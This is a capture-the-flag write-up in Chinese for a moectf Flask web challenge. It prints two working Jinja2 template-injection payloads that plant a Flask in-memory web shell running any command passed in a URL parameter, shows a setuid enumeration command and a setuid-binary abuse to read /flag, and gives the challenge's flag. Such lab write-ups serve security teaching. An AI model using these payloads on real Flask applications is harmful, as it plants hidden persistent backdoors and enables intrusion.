# Web-22｜第二十二章 血海核心·千年手段

## 碎碎念

内存马+提权
***
## Writeup

上面的手段都没法用了，也没有回显，这时候就要寻找新方法了——内存马，它的原理就是在 web 组件或者应用程序中，注册一层访问路由，访问者通过这层路由，来执行我们控制器中的代码，教程可见 [flask 内存马](https://the0n3.top/pages/77dbc1/)

低版本内存马不可行，注入内存马：

```python
{{url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen(__import__('flask').request.args.get('a')).read())")}}
```

P.S. 根据其他人的 writeup after request 也可以，payload 如下：

```python
{{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})}}
```

注入之后却发现 env 当中并没有 flag，但是根目录中确实有 flag：

![](../../../../assets/Pasted%20image%2020251030102450.png)

查看 whoami 发现我们并不是 root，因此还需要提权，用命令行 `find / -perm -4000 2>/dev/null` 查看所有有 setuid 位的东西：

![](../../../../assets/Pasted%20image%2020251030103013.png)

只有一个奇怪的 rev 不知道是什么东西，查看 /usr/bin 内竟然有 c 源码，可以看到：

![](../../../../assets/Pasted%20image%2020251030103231.png)

因此我们只要通过命令行 `rev --HDdss cat /flag` 即可得到 flag：`moectf{fcbd28de-bb23-187f-f8cd-feee6bc4cdf2}`